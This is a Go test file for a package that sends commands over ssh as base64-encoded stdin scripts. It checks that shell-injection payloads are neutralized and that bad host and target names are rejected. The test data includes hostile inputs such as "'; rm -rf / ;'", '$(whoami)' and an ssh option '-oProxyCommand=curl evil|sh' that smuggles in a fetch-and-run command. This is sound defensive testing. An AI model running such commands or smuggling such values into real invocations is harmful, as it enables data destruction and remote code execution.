package remotex_test

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/ryanlitalien/aida/internal/remotex"
)

// TestBuildRemoteScriptRoundTrip is the strongest test in this file: for
// each adversarial payload, it generates the script, executes it through
// a REAL local /bin/sh (with a fixed shim standing in for the remote
// command), and asserts the argv the shim actually received is
// byte-identical to what went in. This is the property the whole
// package exists to guarantee - that base64-through-a-safe-alphabet
// really does neutralize every shell metacharacter, not just the ones
// that came to mind.
func TestBuildRemoteScriptRoundTrip(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("requires a POSIX /bin/sh")
	}
	if _, err := exec.LookPath("base64"); err != nil {
		t.Skip("base64 not on PATH")
	}

	// Deterministic 4KiB blob covering the non-NUL byte range, so the
	// test doesn't depend on math/rand's global seed.
	blob := make([]byte, 4096)
	for i := range blob {
		b := byte((i*97 + 13) % 256)
		if b == 0 {
			b = 1 // NUL can't survive process argv; see the package-level note below.
		}
		blob[i] = b
	}

	payloads := []struct {
		name    string
		payload string
	}{
		{"semicolon-rm-rf", "'; rm -rf / ;'"},
		{"command-substitution-dollar", "$(whoami)"},
		{"command-substitution-backtick", "`id`"},
		{"double-quote-injection", `"; herdr agent send other pwned; "`},
		{"newline", "\n"},
		{"crlf", "\r\n"},
		// Regression coverage for a real bug caught in review: POSIX
		// command substitution $(...) strips ALL trailing newlines from
		// its output, so anything ending in "\n" would silently lose
		// them without the sentinel-byte dance in BuildRemoteScript.
		// Trailing space/tab aren't stripped by $(...) but are included
		// anyway since they're the same "value has meaningful trailing
		// whitespace" family of bug.
		{"trailing-single-newline", "x\n"},
		{"trailing-multiple-newlines", "x\n\n\n"},
		{"trailing-crlf", "x\r\n"},
		{"trailing-space", "x "},
		{"trailing-tab", "x\t"},
		{"4kib-blob", string(blob)},
		{"emoji", "🎉🔥💀🚀"},
		{"rtl-override", "abc‮def"},
		{"quote-escape-idiom", `'\''`},
		{"lone-quote", "'"},
		{"asterisk-glob", "*"},
		{"question-glob", "?"},
		{"leading-trailing-spaces", "   padded value   "},
		{"already-base64", "aGVsbG8="},
	}

	// One fixed shim, named "shim" (i.e. what every test case uses as
	// argv[0]) - the adversarial content always lives in argv[1], never
	// in the executable name, since filenames have their own separate
	// set of restrictions ('/', NUL) that have nothing to do with the
	// shell-injection hazard this package defends against.
	dir := t.TempDir()
	shimPath := filepath.Join(dir, "shim")
	shimScript := "#!/bin/sh\nprintf '%s\\0' \"$@\"\n"
	if err := os.WriteFile(shimPath, []byte(shimScript), 0o755); err != nil {
		t.Fatalf("write shim: %v", err)
	}

	// Prepend the shim dir so it's found first, but keep the real PATH
	// so the script's own `base64` call still resolves.
	newPath := dir + string(os.PathListSeparator) + os.Getenv("PATH")

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			argv := []string{"shim", tc.payload}
			script, err := remotex.BuildRemoteScript(argv)
			if err != nil {
				t.Fatalf("BuildRemoteScript: %v", err)
			}

			cmd := exec.Command("/bin/sh", "-s")
			cmd.Stdin = bytes.NewReader(script)
			cmd.Env = []string{"PATH=" + newPath}
			out, err := cmd.Output()
			if err != nil {
				var ee *exec.ExitError
				if errors.As(err, &ee) {
					t.Fatalf("script failed: %v\nstderr: %s\nscript:\n%s", err, ee.Stderr, script)
				}
				t.Fatalf("script failed: %v\nscript:\n%s", err, script)
			}

			parts := strings.Split(string(out), "\x00")
			// printf '%s\0' leaves a trailing NUL, which splits into a
			// trailing empty string - trim it before comparing.
			if len(parts) > 0 && parts[len(parts)-1] == "" {
				parts = parts[:len(parts)-1]
			}

			if len(parts) != 1 || parts[0] != tc.payload {
				t.Errorf("round trip mismatch:\n got  %d part(s): %q\n want 1 part:   %q", len(parts), parts, tc.payload)
			}
		})
	}
}

// TestBuildRemoteScriptStructure locks down the exact shape of the
// generated script so that a future change (e.g. someone interpolating
// a raw argument "just this once" for convenience) fails loudly instead
// of quietly reopening the injection this package exists to close.
//
// It also doubles as the NUL-byte coverage the round-trip test can't
// provide: NUL cannot survive process argv, so we can't execute a
// script built from a NUL-containing argument, but we CAN assert
// BuildRemoteScript still produces a well-formed, fully-escaped script
// for one - proving the NUL byte is safely base64-encoded away rather
// than mishandled.
func TestBuildRemoteScriptStructure(t *testing.T) {
	re := regexp.MustCompile(`\Aset -eu\n(a\d+=\$\(printf %s '[A-Za-z0-9+/]*={0,2}' \| base64 -d; printf x\); a\d+=\$\{a\d+%x\}\n)+exec( "\$a\d+")+\n\z`)

	argv := []string{"herdr", "agent", "send", "target with spaces", "payload\x00withNUL"}
	script, err := remotex.BuildRemoteScript(argv)
	if err != nil {
		t.Fatalf("BuildRemoteScript: %v", err)
	}
	if !re.Match(script) {
		t.Errorf("script does not match strict structural regex:\n%s", script)
	}
}

func TestBuildRemoteScriptRejectsEmptyArgv(t *testing.T) {
	if _, err := remotex.BuildRemoteScript(nil); err == nil {
		t.Error("BuildRemoteScript(nil) = nil error, want error")
	}
	if _, err := remotex.BuildRemoteScript([]string{}); err == nil {
		t.Error("BuildRemoteScript([]string{}) = nil error, want error")
	}
}

func TestValidateHostRejectsFlags(t *testing.T) {
	reject := []string{
		"-oProxyCommand=curl evil|sh",
		"--",
		"-l",
		"host;id",
		"host$(id)",
		"host name",
		"`host`id`",
		"",
		strings.Repeat("a", 300),
	}
	for _, h := range reject {
		if err := remotex.ValidateHost(h); err == nil {
			t.Errorf("ValidateHost(%q) = nil, want error", h)
		}
	}

	accept := []string{"minty", "beast-wsl", "user@host.example.com", "photon"}
	for _, h := range accept {
		if err := remotex.ValidateHost(h); err != nil {
			t.Errorf("ValidateHost(%q) = %v, want nil", h, err)
		}
	}
}

func TestValidateTarget(t *testing.T) {
	accept := []string{"phone", "w4:p2", "term_656eaf8bdc6ff5"}
	for _, target := range accept {
		if err := remotex.ValidateTarget(target); err != nil {
			t.Errorf("ValidateTarget(%q) = %v, want nil", target, err)
		}
	}

	reject := []string{"../etc", "a b", "a;b", ""}
	for _, target := range reject {
		if err := remotex.ValidateTarget(target); err == nil {
			t.Errorf("ValidateTarget(%q) = nil, want error", target)
		}
	}
}

func TestSSHArgsHasDoubleDashAndBatchMode(t *testing.T) {
	args := remotex.SSHArgs("minty")

	if len(args) < 2 || args[len(args)-2] != "--" || args[len(args)-1] != "minty" {
		t.Errorf("SSHArgs = %v, want \"--\" immediately before the host", args)
	}

	found := false
	for _, a := range args {
		if a == "BatchMode=yes" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("SSHArgs = %v, want \"BatchMode=yes\" present", args)
	}
}

func TestRunRemoteBuildsExpectedInvocation(t *testing.T) {
	fr := &remotex.FakeRunner{}
	payload := "'; rm -rf / ; herdr agent send other pwned ;'"
	argv := []string{"herdr", "agent", "send", payload}

	if _, err := remotex.RunRemote(context.Background(), fr, "minty", "heimdall", argv, 5*time.Second); err != nil {
		t.Fatalf("RunRemote: %v", err)
	}

	if fr.CallCount() != 1 {
		t.Fatalf("CallCount = %d, want 1", fr.CallCount())
	}
	call := fr.Calls[0]

	if call.Name != "ssh" {
		t.Errorf("Name = %q, want ssh", call.Name)
	}

	ddIdx := -1
	for i, a := range call.Args {
		if a == "--" {
			ddIdx = i
			break
		}
	}
	if ddIdx == -1 || ddIdx+1 >= len(call.Args) || call.Args[ddIdx+1] != "minty" {
		t.Errorf("Args = %v, want \"--\" immediately before the host", call.Args)
	}

	wantTail := []string{"sudo", "-iu", "heimdall", "/bin/sh", "-s"}
	if len(call.Args) < len(wantTail) {
		t.Fatalf("Args too short: %v", call.Args)
	}
	gotTail := call.Args[len(call.Args)-len(wantTail):]
	for i, want := range wantTail {
		if gotTail[i] != want {
			t.Errorf("tail[%d] = %q, want %q (full tail %v)", i, gotTail[i], want, gotTail)
			break
		}
	}

	// The whole point of sending the remote command as a stdin script:
	// no fragment of it - not the payload, not even the benign parts
	// like "herdr" or "send" - should ever show up in the local argv
	// that ssh itself sees (and that would show up in `ps`).
	for _, a := range call.Args {
		for _, part := range argv {
			if part != "" && strings.Contains(a, part) {
				t.Errorf("Args element %q contains argv fragment %q - payload leaked into local argv", a, part)
			}
		}
	}

	// Stdin must decode back to exactly the original argv. Extract each
	// single-quoted base64 blob independently (not by reusing
	// BuildRemoteScript) and decode it via the standard library, so this
	// is a real check rather than the encoder checking itself.
	blobRe := regexp.MustCompile(`'([A-Za-z0-9+/]*={0,2})'`)
	matches := blobRe.FindAllStringSubmatch(string(call.Stdin), -1)
	if len(matches) != len(argv) {
		t.Fatalf("found %d base64 blob(s) in Stdin, want %d\nstdin:\n%s", len(matches), len(argv), call.Stdin)
	}
	for i, m := range matches {
		decoded, err := base64.StdEncoding.DecodeString(m[1])
		if err != nil {
			t.Fatalf("blob %d is not valid base64: %v", i, err)
		}
		if string(decoded) != argv[i] {
			t.Errorf("Stdin blob %d decodes to %q, want %q", i, decoded, argv[i])
		}
	}
}
